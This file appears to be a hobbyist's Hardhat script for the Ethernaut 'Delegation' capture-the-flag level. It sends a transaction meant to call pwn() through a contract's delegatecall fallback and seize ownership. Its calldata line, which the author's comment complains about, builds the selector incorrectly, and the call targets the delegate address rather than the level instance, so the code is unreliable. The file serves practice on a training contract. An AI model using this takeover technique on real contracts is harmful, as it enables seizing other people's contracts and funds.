import { ethers } from "hardhat";
import { Contract } from "hardhat/internal/hardhat-network/stack-traces/model";

const CONTRACT_ADDRESS = "0x99323d1Ffb5727d6666c2C4532963edb0bcB8FAE";
const DELEGATE_CONTRACT = "0xbAdC0160eE01D2d6c594938a7d0B56B0858d22B0";
const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
// const ATTACKER_CONTRACT = "0x69e3b78Ba361367FFbF06C1a9dAE1C3c0a86B2a8";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contractDelegation = await ethers.getContractAt(
    "Delegation",
    CONTRACT_ADDRESS,
    signer
  );

  const contractDelegate = await ethers.getContractAt(
    "Delegate",
    CONTRACT_ADDRESS,
    signer
  );

  // send an empty transaction to trigger fallback
  console.log(
    await signer.sendTransaction({
      from: PLAYER_ADDRESS,
      to: DELEGATE_CONTRACT,
      value: 0,
      gasLimit: 50000,
      data: await ethers.utils.keccak256("pwn()"), //This is the line of code that is driving me insane
    })
  );
  // Check the contract address
  // console.log(
  //   "what is the contract address of the delegate contract? ",
  //   await contractDelegation.address
  // );

  // console.log(
  //   "What is the contract address of the delegation contract? ",
  //   await contractDelegate.address
  // );

  // Trigger the fallback function of delegation
  // console.log(
  //   "trigger delegation fallback",
  //   await contractDelegation.fallback({
  //     value: 0,
  //     data: ethers.utils.keccak256("pwn()"),
  //   })
  // );

  // console.log("contract owner is", await contractDelegate.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
